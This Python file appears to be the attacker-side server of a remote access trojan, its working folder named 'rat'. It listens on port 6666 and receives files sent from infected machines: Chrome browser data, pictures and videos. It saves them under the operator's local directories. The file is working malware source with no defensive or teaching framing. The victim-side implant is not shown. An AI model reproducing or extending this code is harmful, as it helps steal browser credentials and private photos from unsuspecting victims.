import socket, os           

socket1 = socket.socket()        
print ('Socket successfully created')

port = 6666

socket1.bind(('', port))        
print ('socket binded to %s' %(port))

socket1.listen(5)    
print ('socket is listening')     

def chrome_data():
    data_len = int(client.recv(1024).decode())
    print(data_len)
    client.send('data received'.encode())

    for i in range(data_len):
        #change the directory once done
        with open(rf"C:\Users\Joe\.vscode\code files\rat\user_data\data{i}", 'wb') as file:
            filechunk = int(client.recv(1024).decode())
            client.send('asdlf;jasd;k'.encode())
            file.write(client.recv(filechunk))

def pictures():
    data_len = int(client.recv(1024).decode())
    print(data_len)
    client.send('data received'.encode())

    file_ext = []

    for i in range(data_len):
        file_ext.append(client.recv(1024).decode())
        client.send(str(file_ext[i]).encode())

    for i in range(data_len):
        #change the directory once done
        with open(rf'C:\Users\Joe\.vscode\code files\rat\pictures\{i}{file_ext[i]}', 'wb') as file:
            filechunk = int(client.recv(1024).decode())
            client.send('asdlf;jasd;k'.encode())
            file.write(client.recv(filechunk))

def one_file():
    with open(r"C:\Users\Joe\.vscode\code files\rat\video1.mp4", 'wb') as file:
        filechunk = int(client.recv(2048).decode())
        client.send('asd;flkj'.encode())
        file.write(client.recv(filechunk))

    with open(r"C:\Users\Joe\.vscode\code files\rat\video2.mp4", 'wb') as file:
        filechunk = int(client.recv(2048).decode())
        client.send('asd;flkj'.encode())
        file.write(client.recv(filechunk))


while True:
    client, address = socket1.accept()
    print ('Got connection from', address)

    print(client.recv(1024).decode())

    client.send('host connected to client'.encode())

    pictures()
    client.close()

    client, address = socket1.accept()   
    chrome_data()
    client.close()